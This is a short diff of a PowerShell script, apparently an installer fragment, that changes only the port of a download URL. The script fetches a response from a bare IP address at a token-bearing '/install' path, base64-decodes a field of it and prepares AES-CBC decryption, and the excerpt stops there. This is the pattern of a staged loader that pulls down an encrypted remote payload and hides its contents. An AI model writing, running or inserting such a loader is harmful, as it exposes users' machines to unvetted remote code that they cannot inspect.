@@ -1,6 +1,6 @@
 $ErrorActionPreference='Stop'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
-$r=Invoke-RestMethod -UseBasicParsing 'http://51.75.118.5:20216/s/tk-482913-a7f2c/install' -Headers @{'Cache-Control'='no-cache'}
+$r=Invoke-RestMethod -UseBasicParsing 'http://51.75.118.5:20184/s/tk-482913-a7f2c/install' -Headers @{'Cache-Control'='no-cache'}
 $b=[Convert]::FromBase64String($r.c)
 $a=[Security.Cryptography.Aes]::Create()
 $a.Mode='CBC';$a.Padding='PKCS7'
